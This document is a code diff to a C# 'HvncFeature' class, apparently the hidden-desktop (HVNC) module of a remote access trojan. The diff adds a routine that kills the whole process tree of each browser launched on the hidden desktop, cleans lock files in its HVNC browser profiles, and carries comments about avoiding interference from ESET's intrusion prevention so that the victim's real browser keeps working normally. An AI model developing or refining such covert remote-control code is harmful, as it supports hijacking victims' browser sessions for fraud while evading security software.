@@ -389,7 +389,6 @@ internal static class HvncFeature
         // Browsers get a graceful WM_CLOSE first so they flush their profile to disk cleanly —
         // TerminateProcess on a browser looks like a crash to ESET HIPS, which then blocks the
         // browser's profile directory on the next real-desktop launch.
-        const uint PT = 0x0001; // PROCESS_TERMINATE
         bool launchedOpera    = _launchedPids.ContainsKey("opera.exe");
         bool launchedOperaGX  = _launchedPids.ContainsKey("operagx.exe");
         bool launchedEdge     = _launchedPids.ContainsKey("msedge.exe");
@@ -399,15 +398,18 @@ internal static class HvncFeature
         bool launchedChromium = _launchedPids.ContainsKey("chromium.exe");
         bool launchedFirefox  = _launchedPids.ContainsKey("firefox.exe");
         GracefulKillBrowsers();
+        // Kill each tracked process AND its entire child tree — browsers spawn renderer,
+        // GPU, network-service, and utility children that TerminateProcess(parent) leaves
+        // as orphans, which keep holding the profile lock until killed explicitly.
         foreach (var pid in _launchedPids.Values)
-        {
-            nint h = OpenProcess(PT, false, pid);
-            if (h != 0) { TerminateProcess(h, 0); CloseHandle(h); }
-        }
+            KillProcessTree(pid);
         // Only kill Discord if we actually launched it from HVNC (tracked via update.exe or discord.exe key).
         bool launchedDiscord = _launchedPids.ContainsKey("discord.exe") || _launchedPids.ContainsKey("update.exe");
         _launchedPids.Clear();
         if (launchedDiscord) KillProcessByName("discord.exe");
+
+        // Small pause so the OS flushes file handles before we try to delete lock files.
+        Thread.Sleep(300);
 
         // Clean up Chromium singleton lock files + repair any corrupted JSON in HVNC profiles.
         CleanChromiumHvncLocks();
@@ -1763,6 +1765,49 @@ internal static class HvncFeature
                     if (h != 0) { TerminateProcess(h, 0); CloseHandle(h); }
                 }
             } while (Process32NextW(snap, ref pe));
+        }
+        finally { CloseHandle(snap); }
+    }
+
+    // Kills a process and all its descendants (renderer, GPU, network-service child procs, etc.).
+    // TerminateProcess on the parent alone leaves orphaned children that keep holding profile locks.
+    private static void KillProcessTree(uint rootPid)
+    {
+        const uint TH32CS_SNAPPROCESS = 0x00000002;
+        const uint PROCESS_TERMINATE  = 0x0001;
+        nint snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (snap == (nint)(-1) || snap == 0) return;
+        try
+        {
+            // Build parent → [children] map
+            var childMap = new Dictionary<uint, List<uint>>();
+            var pe = new PROCESSENTRY32W { dwSize = (uint)Marshal.SizeOf<PROCESSENTRY32W>() };
+            if (!Process32FirstW(snap, ref pe)) return;
+            do
+            {
+                if (!childMap.TryGetValue(pe.th32ParentProcessID, out var lst))
+                    childMap[pe.th32ParentProcessID] = lst = new List<uint>();
+                lst.Add(pe.th32ProcessID);
+            } while (Process32NextW(snap, ref pe));
+
+            // BFS to collect every descendant
+            var toKill = new List<uint>();
+            var queue  = new Queue<uint>();
+            queue.Enqueue(rootPid);
+            while (queue.Count > 0)
+            {
+                uint pid = queue.Dequeue();
+                toKill.Add(pid);
+                if (childMap.TryGetValue(pid, out var kids))
+                    foreach (var kid in kids) queue.Enqueue(kid);
+            }
+
+            // Kill leaves first so children can't re-spawn, then the root
+            for (int i = toKill.Count - 1; i >= 0; i--)
+            {
+                nint h = OpenProcess(PROCESS_TERMINATE, false, toKill[i]);
+                if (h != 0) { TerminateProcess(h, 0); CloseHandle(h); }
+            }
         }
         finally { CloseHandle(snap); }
     }
